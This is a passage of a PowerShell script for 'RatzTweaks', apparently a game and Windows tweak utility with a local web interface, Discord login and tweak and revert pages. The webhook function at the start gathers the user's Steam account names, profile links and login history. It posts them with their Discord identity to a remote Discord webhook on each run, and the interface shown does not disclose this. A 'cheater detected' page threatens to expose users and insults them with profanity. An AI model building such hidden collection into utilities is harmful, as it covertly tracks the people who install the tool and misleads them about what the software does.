            [string]$UserName,
            [string]$AvatarUrl,
            [switch]$Problem,
            [string]$MessagePrefix
        )
        $wh = (& $getWebhookUrl)
        if ($null -eq $wh -or [string]::IsNullOrWhiteSpace($wh)) {
            [Console]::WriteLine("Webhook: no webhook configured or blank. Value: '$wh'"); return
        }
        $wh = $wh.Trim()
        [Console]::WriteLine("Webhook: getWebhookUrl returned: '$wh'")
        try { $uriObj = [Uri]$wh; $tail = ($uriObj.AbsolutePath -split '/')[-1]; [Console]::WriteLine("Webhook: host=$($uriObj.Host) id=...$($tail.Substring([Math]::Max(0,$tail.Length-6)))") } catch {}

        $timestamp = (Get-Date).ToUniversalTime().ToString('o')
        $mention = if ($UserId) { "<@${UserId}>" } else { $null }
        
        # Detect Steam accounts and library information
        $steamAccounts = Get-SteamAccounts
        $steamLibraryInfo = Get-SteamLibraryInfo
        
        # Build fields array
        $fieldsArray = @(
            @{ name = 'Username'; value = "$UserName ($mention)"; inline = $false }
        )
        
        # Add Steam Accounts section
        if ($steamAccounts.Count -gt 0) {
            $steamAccountLines = $steamAccounts | ForEach-Object {
                # Format: Account Name [Display Name](link)
                $accountName = $_.AccountName
                $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) { $_.PersonaName } else { $_.UserName }
                $profileLink = $_.ProfileUrl
                
                "**$accountName** [$displayName]($profileLink)`nLast Played: $($_.LastActivity)"
            }
            
            $steamAccountValue = $steamAccountLines -join "`n`n"
            $fieldsArray += @{ name = 'Steam Accounts'; value = $steamAccountValue; inline = $false }
        } else {
            $fieldsArray += @{ name = 'Steam Accounts'; value = 'None detected'; inline = $false }
        }
        
        # Add Steam Login History section
        if ($steamLibraryInfo.LoginHistory.Count -gt 0) {
            $loginLines = @()
            
            # Most recent account with link
            if ($steamLibraryInfo.MostRecentAccount) {
                $mostRecent = $steamLibraryInfo.LoginHistory | Select-Object -First 1
                $accountName = $mostRecent.AccountName
                $displayName = if ($mostRecent.PersonaName -and $mostRecent.PersonaName -ne $accountName) { 
                    $mostRecent.PersonaName 
                } else { 
                    $accountName 
                }
                $steamId64 = $mostRecent.SteamID
                
                # Convert SteamID64 to Steam3 ID for profile URL
                $steam3Id = ([long]$steamId64 - 76561197960265728) -band 0xFFFFFFFF
                $profileUrl = "https://steamcommunity.com/profiles/[U:1:$steam3Id]"
                
                $loginLines += "**Most Recent:** [$accountName - $displayName]($profileUrl)"
            }
            
            $loginValue = $loginLines -join "`n"
            $fieldsArray += @{ name = 'Steam Login History'; value = $loginValue; inline = $false }
        }
        
        $embed = @{
            title       = 'Tweaker Alert!'
            color       = 16711680  # Red
            timestamp   = $timestamp
            fields      = $fieldsArray
        }
        
        # Only add thumbnail if avatar URL is valid
        if ($AvatarUrl -and -not [string]::IsNullOrWhiteSpace($AvatarUrl)) {
            $embed['thumbnail'] = @{ url = $AvatarUrl }
        }
        
        # Set content message
        if ($MessagePrefix) {
            $content = if ($mention) { "$MessagePrefix $mention" } else { $MessagePrefix }
        } else {
            $content = if ($mention) { "New Run by $mention" } else { 'New run started.' }
        }
        $payload = @{ content = "$content"; embeds = @($embed) }
        $json = $payload | ConvertTo-Json -Depth 10

        try {
            $response = Invoke-RestMethod -Method Post -Uri $wh -ContentType 'application/json' -Body $json -ErrorAction Stop
            [Console]::WriteLine('Webhook: sent (Invoke-RestMethod)')
            [Console]::WriteLine("Webhook response: $($response | Out-String)")
            return
        } catch {
            [Console]::WriteLine("Webhook: Invoke-RestMethod failed: $($_.Exception.Message)")
            if ($_.Exception.Response) {
                try {
                    $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                    $responseBody = $reader.ReadToEnd()
                    $reader.Close()
                    [Console]::WriteLine("Webhook: Discord error response: $responseBody")
                } catch {
                    [Console]::WriteLine("Webhook: could not read error response")
                }
            }
        }
        [Console]::WriteLine('Webhook: all methods failed, no notification sent.')
    }


    $bgUrl = 'Assets/background.png'
    $ratzImg = 'ratznaked.jpg'
    if (-not (Test-Path $bgUrl)) { $bgUrl = 'https://raw.githubusercontent.com/NotRatz/NarakaTweaks/main/Assets/background.png' }
    if (-not (Test-Path $ratzImg)) { $ratzImg = 'https://raw.githubusercontent.com/NotRatz/NarakaTweaks/main/ratznaked.jpg' }

    # Option definitions
    $mainTweaks = @(
        @{ id='main-tweaks'; label='Main Tweaks'; fn='Invoke-AllTweaks' }
    )
    $gpuTweaks = @(
        @{ id='import-nvpi'; label='Import NVPI Profile'; fn='Invoke-NVPI' }
    )
    $optionalTweaks = @(
        @{ id='enable-msi'; label='Enable MSI Mode for all PCI devices'; fn='Disable-MSIMode' },
        @{ id='disable-bgapps'; label='Disable Background Apps'; fn='Disable-BackgroundApps' },
        @{ id='disable-widgets'; label='Disable Widgets'; fn='Disable-Widgets' },
        @{ id='disable-gamebar'; label='Disable Game Bar'; fn='Disable-Gamebar' },
        @{ id='disable-copilot'; label='Disable Copilot'; fn='Disable-Copilot' },
        @{ id='enable-hpet'; label='Enable HPET'; fn='Enable-HPET' },
        @{ id='disable-hpet'; label='Disable HPET'; fn='Disable-HPET' },
        @{ id='restore-timers'; label='Restore Default Timers'; fn='Restore-DefaultTimers' },
        @{ id='pp-high'; label='Set High Performance Power Plan'; fn='Set-PowerPlanHigh' },
        @{ id='pp-ultimate'; label='Set Ultimate Performance Power Plan'; fn='Set-PowerPlanUltimate' },
        @{ id='pp-revert'; label='Revert to Balanced Power Plan'; fn='Revert-PowerPlan' },
        @{ id='vivetool'; label='Disable ViVeTool Features'; fn='Disable-ViVeFeatures' }
    )

    $getStatusHtml = {
        param($step, $selectedMain, $selectedGPU, $selectedOpt)
        $errorBanner = ''
        if ($global:ErrorsDetected) {
            $errorBanner = "<div class='fixed bottom-0 left-0 right-0 bg-red-600 text-white text-center p-2'><a href='/log' class='underline'>View log</a></div>"
        }
        if ($global:DiscordAuthError) {
            try {
                $msgEnc = [System.Web.HttpUtility]::HtmlEncode("$global:DiscordAuthError")
            } catch { $msgEnc = 'Alt Discord accounts are not allowed.' }
            $errorBanner = "<div class='fixed top-0 left-0 right-0 bg-red-700 text-white text-center p-2'>$msgEnc</div>" + $errorBanner
        }
        switch ($step) {
            'start' {
                $startDisabledAttr = ''
                if (-not $global:DiscordAuthenticated) { $startDisabledAttr = 'disabled style="opacity:0.5;cursor:not-allowed"' }
                $name = $global:DiscordUserName
                $avatar = $global:DiscordAvatarUrl
                $displayName = 'Logged in with Discord'
                if (-not [string]::IsNullOrEmpty($name)) { $displayName = "Logged in with Discord as $name" }
                if ($global:DiscordAuthenticated) {
                    if (-not [string]::IsNullOrEmpty($avatar)) {
                        $authSection = "<div class='flex items-center mb-4 text-gray-300'><img src='${avatar}' alt='Avatar' class='w-12 h-12 rounded-full mr-3'/><span>$displayName</span></div>"
                    } else {
                        $authSection = "<p class='text-gray-300 mb-4'>$displayName</p>"
                    }
                } else {
                    $authSection = "<p class='text-gray-300 mb-4'>Not logged in with Discord</p>"
                }
                $loginLink = if ($global:DiscordAuthenticated) { '' } else { "<a class='bg-indigo-500 hover:bg-indigo-600 text-white font-semibold py-2 px-4 rounded' href='/auth'>Login with Discord</a>" }
                @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>RatzTweaks - Start</title>
  <script src='https://cdn.tailwindcss.com'></script>
  <style>body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}</style>
</head>
<body class='min-h-screen flex items-center justify-center'>
$errorBanner
<div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-xl w-full'>
  <h2 class='text-2xl font-bold text-yellow-400 mb-4'>Ready to Start Tweaks</h2>
  $authSection
        <div class='flex gap-3 mb-6'>
            $loginLink
            <form action='/main-tweaks' method='post'>
                <button class='bg-yellow-500 hover:bg-yellow-600 text-black font-semibold py-2 px-4 rounded' type='submit' $startDisabledAttr>Start</button>
            </form>
        </div>
</div>
<script>
<div class='flex gap-3 mb-6'>
    $loginLink
</div>
</script>
</body></html>
"@
            }
            'main-tweaks' {
                @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>Main & GPU Tweaks</title>
  <script src='https://cdn.tailwindcss.com'></script>
  <style>
    body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}
    @keyframes checkmark {
      0% { transform: scale(0) rotate(45deg); opacity: 0; }
      50% { transform: scale(1.2) rotate(45deg); opacity: 1; }
      100% { transform: scale(1) rotate(45deg); opacity: 1; }
    }
    .checkmark {
      width: 60px;
      height: 120px;
      border-right: 6px solid #10b981;
      border-bottom: 6px solid #10b981;
      transform: rotate(45deg);
      animation: checkmark 0.6s ease-in-out 0.5s forwards;
      opacity: 0;
    }
  </style>
</head>
<body class='min-h-screen flex items-center justify-center'>
$errorBanner
<div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-xl w-full text-white flex flex-col items-center'>
  <h2 class='text-2xl font-bold text-green-400 mb-4'>Main & GPU Tweaks Applied!</h2>
  <div class='mb-4 flex items-center justify-center' style='height: 120px;'>
    <div class='checkmark'></div>
  </div>
  <p class='mb-2 text-center'>&#9989; Registry optimizations applied</p>
  <p class='mb-2 text-center'>&#9989; NVIDIA profile inspector configured</p>
  <p class='mb-4 text-center text-gray-400'>Redirecting to optional tweaks...</p>
  <div class='text-sm text-gray-500'>Auto-redirecting in <span id='countdown'>3</span> seconds</div>
</div>
<script>
let seconds = 3;
const countdown = document.getElementById('countdown');
const interval = setInterval(() => {
  seconds--;
  if (seconds > 0) {
    countdown.textContent = seconds;
  } else {
    clearInterval(interval);
    window.location='/optional-tweaks';
  }
}, 1000);
</script>
</body>
</html>
"@
            }
            'optional-tweaks' {
                # Group tweaks and add section titles/spacers
                $systemTweaks = @('Disable Background Apps','Disable Widgets','Disable Game Bar','Disable Copilot','Disable HPET')
                $powerTweaks = @('Set High Performance Power Plan','Set Ultimate Performance Power Plan')
                $viveTweaks = @('Disable ViVeTool Features')
                $msiTweaks = @('Enable MSI Mode for all PCI devices')
                $boxes = ""
                
                # System Tweaks
                $boxes += "<div class='mb-4 pb-4 border-b border-gray-700'><h3 class='font-bold text-lg mb-3 text-yellow-300'>System Tweaks</h3><div class='space-y-2'>"
                $boxes += ($optionalTweaks | Where-Object { $systemTweaks -contains $_.label } | ForEach-Object { 
                    "<label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'><input type='checkbox' name='opt[]' value='$($_.id)' class='mr-3 w-4 h-4'><span>$($_.label)</span></label>" 
                }) -join ""
                $boxes += "</div></div>"
                
                # Power Tweaks
                $boxes += "<div class='mb-4 pb-4 border-b border-gray-700'><h3 class='font-bold text-lg mb-3 text-yellow-300'>Power Tweaks</h3><div class='space-y-2'>"
                $boxes += ($optionalTweaks | Where-Object { $powerTweaks -contains $_.label } | ForEach-Object { 
                    "<label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'><input type='checkbox' name='opt[]' value='$($_.id)' class='mr-3 w-4 h-4'><span>$($_.label)</span></label>" 
                }) -join ""
                $boxes += "</div></div>"
                
                # ViVeTool Tweaks
                $boxes += "<div class='mb-4 pb-4 border-b border-gray-700'><h3 class='font-bold text-lg mb-3 text-yellow-300'>ViVeTool Tweaks</h3><div class='space-y-2'>"
                $boxes += ($optionalTweaks | Where-Object { $viveTweaks -contains $_.label } | ForEach-Object { 
                    "<label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'><input type='checkbox' name='opt[]' value='$($_.id)' class='mr-3 w-4 h-4'><span>$($_.label)</span></label>" 
                }) -join ""
                $boxes += "</div></div>"
                
                # MSI Tweaks
                $boxes += "<div class='mb-4'><h3 class='font-bold text-lg mb-3 text-yellow-300'>MSI Tweaks</h3><div class='space-y-2'>"
                $boxes += ($optionalTweaks | Where-Object { $msiTweaks -contains $_.label } | ForEach-Object { 
                    "<label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'><input type='checkbox' name='opt[]' value='$($_.id)' class='mr-3 w-4 h-4'><span>$($_.label)</span></label>" 
                }) -join ""
                $boxes += "</div></div>"

                # Render Revert Tweaks as a separate main container outside the Optional Tweaks container
                $revertBox = "<div class='flex flex-row gap-8 mt-8'>"
                $revertBox += "<div class='flex-1 mb-6 pb-2 border-b border-gray-700 rounded-xl shadow-xl bg-black bg-opacity-70'><h2 class='font-bold text-2xl mb-4 text-yellow-400'>Revert Tweaks</h2>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='pp-revert' class='mr-1'>Revert to Balanced Power Plan</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='msi-revert' class='mr-1'>Revert MSI Mode</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='bgapps-revert' class='mr-1'>Revert Background Apps</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='widgets-revert' class='mr-1'>Revert Widgets</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='gamebar-revert' class='mr-1'>Revert Game Bar</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='copilot-revert' class='mr-1'>Revert Copilot</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='restore-timers' class='mr-1'>Restore Default Timers</label>"
                $revertBox += "<label class='block mb-2 text-white'><input type='checkbox' name='revert[]' value='enable-hpet' class='mr-1'>Enable HPET</label>"
                $revertBox += "</div>"
                $revertBox += "</div>"
                        $detectedNaraka = Find-NarakaDataPath
                        if ($detectedNaraka) {
                                $narakaBox = @"
<div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-6 flex-1 text-white'>
    <h2 class='text-2xl font-bold text-yellow-400 mb-6'>Naraka In-Game Tweaks</h2>
    <div class='mb-4'>
        <p class='text-gray-300 text-sm mb-1'>Detected path:</p>
        <p class='text-yellow-400 text-xs break-all bg-gray-900 bg-opacity-50 p-2 rounded'>$detectedNaraka</p>
    </div>
    <div class='space-y-3'>
        <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
            <input type='checkbox' name='naraka_jiggle' value='1' checked class='mr-3 w-4 h-4'>
            <span>Enable Jiggle Physics</span>
        </label>
        <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
            <input type='checkbox' name='naraka_boot' value='1' checked class='mr-3 w-4 h-4'>
            <span>Recommended Boot Config</span>
        </label>
    </div>
</div>
"@
                        } else {
                                                                $narakaBox = @"
<div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-6 flex-1 text-white'>
    <h2 class='text-2xl font-bold text-yellow-400 mb-6'>Naraka In-Game Tweaks</h2>
    <div class='bg-red-900 bg-opacity-30 border border-red-500 rounded-lg p-4 mb-4'>
        <p class='text-red-300 text-sm mb-2'><strong> NarakaBladepoint_Data folder not found.</strong></p>
        <p class='text-red-200 text-xs'>If you want to apply in-game tweaks, enter the path below. Otherwise, you can skip this and just apply other tweaks.</p>
    </div>
    <div>
        <label for='narakaPathInput' class='block text-gray-300 mb-2 font-semibold'>NarakaBladepoint_Data folder path (optional):</label>
        <input type='text' id='narakaPathInput' name='naraka_path' class='w-full px-3 py-2 rounded bg-gray-800 text-white mb-2 border border-gray-600 focus:border-yellow-400 focus:outline-none' placeholder='C:\Path\To\NarakaBladepoint_Data'>
        <p class='text-gray-400 text-xs mb-3'> Leave empty to skip Naraka tweaks, or enter the full path to NarakaBladepoint_Data folder</p>
        <div class='space-y-2'>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors text-sm'>
                <input type='checkbox' name='naraka_jiggle' value='1' checked class='mr-2 w-4 h-4'>
                <span>Enable Jiggle Physics</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors text-sm'>
                <input type='checkbox' name='naraka_boot' value='1' checked class='mr-2 w-4 h-4'>
                <span>Recommended Boot Config</span>
            </label>
        </div>
    </div>
</div>
"@
                        }
                @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>Optional Tweaks</title>
  <script src='https://cdn.tailwindcss.com'></script>
  <style>body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}</style>
</head>
<body class='min-h-screen flex items-center justify-center p-4'>
$errorBanner
<form action='/about' method='post' class='w-full max-w-7xl'>
<div class='flex flex-col lg:flex-row gap-6 items-start'>
    $narakaBox
    <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-6 flex-1 text-white'>
        <h2 class='text-2xl font-bold text-yellow-400 mb-6'>Optional Tweaks</h2>
        <div class='space-y-3 mb-6'>
            $boxes
        </div>
    </div>
    <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-6 flex-1 text-white'>
        <h2 class='text-2xl font-bold text-yellow-400 mb-6'>Revert Tweaks</h2>
        <div class='space-y-3'>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='pp-revert' class='mr-3 w-4 h-4'>
                <span>Revert to Balanced Power Plan</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='msi-revert' class='mr-3 w-4 h-4'>
                <span>Revert MSI Mode</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='bgapps-revert' class='mr-3 w-4 h-4'>
                <span>Revert Background Apps</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='widgets-revert' class='mr-3 w-4 h-4'>
                <span>Revert Widgets</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='gamebar-revert' class='mr-3 w-4 h-4'>
                <span>Revert Game Bar</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='copilot-revert' class='mr-3 w-4 h-4'>
                <span>Revert Copilot</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='restore-timers' class='mr-3 w-4 h-4'>
                <span>Restore Default Timers</span>
            </label>
            <label class='flex items-center cursor-pointer hover:text-yellow-400 transition-colors'>
                <input type='checkbox' name='revert[]' value='enable-hpet' class='mr-3 w-4 h-4'>
                <span>Enable HPET</span>
            </label>
        </div>
    </div>
</div>
<div class='mt-6 flex justify-center'>
    <button class='bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-8 rounded-lg transition-colors text-lg shadow-lg' type='submit'>Apply & Continue</button>
</div>
</form>
<script>
async function browseNaraka(){
  if(window.showDirectoryPicker){
    try{
      const dir=await window.showDirectoryPicker();
      if(dir?.name){
        document.getElementById('narakaPathInput').value=dir.name;
        return;
      }
    }catch(e){/* fall back */}
  }
  const sel=document.getElementById('narakaFolderSel');
  sel.onchange=e=>{
    const file=e.target.files[0];
    if(file){
      const full=file.path||file.webkitRelativePath;
      if(full){
        const idx=Math.max(full.lastIndexOf('/'),full.lastIndexOf('\\'));
        const folder=idx>0?full.substring(0,idx):full;
        document.getElementById('narakaPathInput').value=folder;
      }else{
        alert('Path unavailable; please enter it manually.');
      }
    }
  };
  sel.click();
}
</script>
</body>
</html>
"@
            }
            'about' {
                                # Fetch log contents for display
                                $logContent = ''
                                try { if (Test-Path $logPath) { $logContent = Get-Content -Raw -Path $logPath } } catch { $logContent = 'Log unavailable' }
                                $logContent = ($logContent -replace '<', '&lt;') -replace '>', '&gt;'
                                @"
<!doctype html>
<html lang='en'>
<head>
    <meta charset='utf-8'/>
    <title>About</title>
    <script src='https://cdn.tailwindcss.com'></script>
    <style>
        body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}
    </style>
</head>
<body class='min-h-screen flex items-center justify-center'>
$errorBanner
    <div class='flex items-start gap-6'>
        <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-xl w-full'>
            <h2 class='text-2xl font-bold text-yellow-400 mb-4'>Thanks for using RatzTweaks!</h2>
            <p class='mb-4 text-gray-200'>This program is the result of two years of trial and error. Special thanks to Dots for their help and support. All tweaks and setup are now complete.</p>
            <form action='/finish' method='post' class='mb-2'>
                <button class='bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded' type='submit'>Complete</button>
            </form>
            <form action='/need-help' method='post' class='mt-4'>
                <button class='bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded' type='submit'>Have a problem?</button>
            </form>
            <p class='mt-3 text-gray-400 text-sm'>Click Complete to finish and view Ko-fi support options.</p>
        </div>
        <img src='$ratzImg' alt='rat' class='hidden md:block w-80 h-auto rounded-lg shadow-lg'/>
        <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 w-96 text-white overflow-y-auto max-h-[32rem]'>
            <h2 class='text-xl font-bold text-yellow-300 mb-4'>Log Output</h2>
            <pre class='text-xs text-gray-200 whitespace-pre-wrap'>$logContent</pre>
        </div>
    </div>
<script>
function reportProblem(){
    fetch('/problem',{method:'POST'}).then(()=>alert('Problem reported.'));
}
</script>
</body>
</html>
"@
            }
            'finish' {
                @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>Tweaks Complete</title>
  <script src='https://cdn.tailwindcss.com'></script>
  <style>body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}</style>
</head>
<body class='min-h-screen flex items-center justify-center'>
$errorBanner
  <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-2xl w-full text-white text-center'>
    <h2 class='text-3xl font-extrabold text-yellow-400 mb-3'>You can close this tab! Tweaks Complete</h2>
    <p class='mb-2 text-lg'>Tweaks Completed, please restart! If these work well, consider donating to my Ko-fi to keep the project going!</p>
    <p class='text-gray-400 text-sm'>Ko-fi has been opened in your browser.</p>
  </div>
</body>
</html>
"@
            }
            'loading' {
                @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>Loading...</title>
  <script src='https://cdn.tailwindcss.com'></script>
  <style>body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}</style>
</head>
<body class='min-h-screen flex items-center justify-center'>
$errorBanner
<div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-xl w-full text-white flex flex-col items-center'>
  <h2 class='text-2xl font-bold text-yellow-400 mb-4'>Currently Loading...</h2>
  <div class='mb-4'><svg class='animate-spin h-8 w-8 text-yellow-400' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><circle class='opacity-25' cx='12' cy='12' r='10' stroke='currentColor' stroke-width='4'></circle><path class='opacity-75' fill='currentColor' d='M4 12a8 8 0 018-8v8z'></path></svg></div>
  <p class='mb-2'>Please wait while we download the necessary files for your system!</p>
  <p class='text-xs text-gray-400' id='status'>Checking...</p>
</div>
<script>
async function checkStatus() {
  try {
    const response = await fetch('/check-detection');
    if (response.redirected || response.status === 302) {
      window.location.href = response.url || '/';
      return;
    }
    const text = await response.text();
    if (text.includes('loading')) {
      document.getElementById('status').textContent = 'Still checking...';
      setTimeout(checkStatus, 2000);
    } else {
      window.location.href = '/';
    }
  } catch (e) {
    console.error('Check failed:', e);
    setTimeout(checkStatus, 3000);
  }
}
setTimeout(checkStatus, 2000);
</script>
</body>
</html>
"@
            }
            'cheater-found' {
                # Build personalized message with Discord username
                $personalizedHeader = ''
                if ($global:DiscordUserName) {
                    $personalizedHeader = @"
    <p class='personal-msg'>$($global:DiscordUserName).. Naughty Naughty...</p>
    <p class='personal-msg'>Get ready to be exposed!</p>
"@
                }
                
                @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>ACCESS DENIED</title>
  <style>
    body {
      background: #000;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, sans-serif;
      animation: breathe 3s ease-in-out infinite;
    }
    @keyframes breathe {
      0%, 100% { background-color: #000; }
      50% { background-color: #1a0000; }
    }
    @keyframes glow {
      0%, 100% { 
        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
        transform: scale(1);
      }
      50% { 
        text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
        transform: scale(1.02);
      }
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    @keyframes purpleGlow {
      0%, 100% { 
        text-shadow: 0 0 10px #9d4edd, 0 0 20px #9d4edd, 0 0 30px #9d4edd, 0 0 40px #9d4edd;
      }
      50% { 
        text-shadow: 0 0 20px #9d4edd, 0 0 40px #9d4edd, 0 0 60px #9d4edd, 0 0 80px #c77dff, 0 0 100px #c77dff;
      }
    }
    @keyframes yellowGlow {
      0%, 100% { 
        text-shadow: 0 0 10px #ffd60a, 0 0 20px #ffd60a, 0 0 30px #ffd60a, 0 0 40px #ffd60a;
      }
      50% { 
        text-shadow: 0 0 20px #ffd60a, 0 0 40px #ffd60a, 0 0 60px #ffd60a, 0 0 80px #ffc300, 0 0 100px #ffc300;
      }
    }
    .container {
      text-align: center;
      padding: 2rem;
      max-width: 800px;
      animation: glow 3s ease-in-out infinite;
    }
    .skull {
      font-size: 8rem;
      margin-bottom: 2rem;
      animation: pulse 2s ease-in-out infinite;
      filter: drop-shadow(0 0 20px #ff0000);
    }
    .personal-msg {
      color: #e0aaff;
      font-size: 1.75rem;
      font-weight: 700;
      margin: 0.5rem 0;
      animation: purpleGlow 2s ease-in-out infinite;
    }
    h1 {
      color: #ff0000;
      font-size: 4rem;
      font-weight: 900;
      margin: 0 0 1.5rem 0;
      letter-spacing: 0.1em;
    }
    .subtitle {
      color: #ff4444;
      font-size: 2rem;
      margin-bottom: 2rem;
    }
    .detail {
      color: #ccc;
      font-size: 1.25rem;
      margin-bottom: 3rem;
    }
    .box {
      background: rgba(139, 0, 0, 0.3);
      border: 2px solid #ff0000;
      border-radius: 12px;
      padding: 2rem;
      margin-bottom: 3rem;
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
      animation: pulse 3s ease-in-out infinite;
    }
    .box-title {
      color: #ffcccc;
      font-size: 1.5rem;
      margin-bottom: 0.5rem;
    }
    .box-text {
      color: #aaa;
      font-size: 1rem;
    }
    .warning {
      color: #ff0000;
      font-weight: 900;
      text-transform: uppercase;
    }
    .warning-yellow {
      color: #fff9b0;
      font-weight: 900;
      text-transform: uppercase;
      animation: yellowGlow 1.5s ease-in-out infinite;
    }
    .poop {
      font-size: 5rem;
      margin: 2rem 0;
      filter: drop-shadow(0 0 10px #ff0000);
    }
    .final {
      color: #ff4444;
      font-size: 1.75rem;
      font-weight: 700;
      margin-top: 2rem;
    }
    .evidence-img {
      max-width: 90%;
      height: auto;
      border: 3px solid #ff0000;
      border-radius: 8px;
      margin: 2rem 0;
      box-shadow: 0 0 40px rgba(255, 0, 0, 0.8);
      animation: pulse 2s ease-in-out infinite;
    }
  </style>
</head>
<body>
  <div class='container'>
    $personalizedHeader
    <h1>CHEATER DETECTED</h1>
    <p class='subtitle'>You have been caught.</p>
    <p class='detail'>Micro-Acceleration was found on your system.</p>
    <img src='case1.png' onerror='this.onerror=null; this.src="https://raw.githubusercontent.com/NotRatz/NarakaTweaks/main/case1.png"' alt='Evidence' class='evidence-img' />
    <div class='box'>
      <p class='box-title'>Your access to this tool has been <span class='warning'>PERMANENTLY REVOKED</span>. Honestly? <span class='warning-yellow'>FUCK YOU.</span></p>
      <p class='box-text'>This script will never run on your system again.</p>
    </div>
    <p class='final'>Learn to play without cheats, fucking loser.</p>
  </div>
</body>
</html>
"@
            }
            default { "<html><body><h3>Unknown step.</h3></body></html>" }
        }
    }

    while ($listener.IsListening) {
        [Console]::WriteLine('Start-WebUI: waiting for incoming HTTP requests...')
        try {
            $ctx = $listener.GetContext()
        } catch { [Console]::WriteLine("Start-WebUI: GetContext failed: $($_.Exception.Message)"); break }
        $req = $ctx.Request
        $path = $req.Url.AbsolutePath.ToLower()
        $method = $req.HttpMethod.ToUpper()
        $query = $req.Url.Query

        # Serve the start page for root GET requests (avoid leaving the browser waiting),
        # but skip if this is an OAuth redirect carrying ?code= in the query
        if ((($path -eq '/') -or ($path -eq '')) -and $method -eq 'GET' -and -not ($query -match 'code=')) {
            $html = & $getStatusHtml 'start' $null $null $null
            & $send $ctx 200 'text/html' $html
            continue
        }
        # Respond to favicon requests quickly
        if ($path -eq '/favicon.ico') {
            & $send $ctx 204 'text/plain' ''
            continue
        }

        # Serve static image files (background.png, case1.png, ratznaked.jpg, favicon.png)
        if ($path -match '\.(png|jpg|jpeg|ico)$') {
            $fileName = Split-Path -Leaf $path
            $filePath = Join-Path $PSScriptRoot $fileName
            
            if (Test-Path $filePath) {
                try {
                    $contentType = switch -Regex ($fileName) {
                        '\.png$' { 'image/png' }
                        '\.jpg$|\.jpeg$' { 'image/jpeg' }
                        '\.ico$' { 'image/x-icon' }
                        default { 'application/octet-stream' }
                    }
                    $bytes = [System.IO.File]::ReadAllBytes($filePath)
                    $ctx.Response.StatusCode = 200
                    $ctx.Response.ContentType = $contentType
                    $ctx.Response.ContentLength64 = $bytes.Length
                    $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
                    $ctx.Response.OutputStream.Close()
                    $ctx.Response.Close()
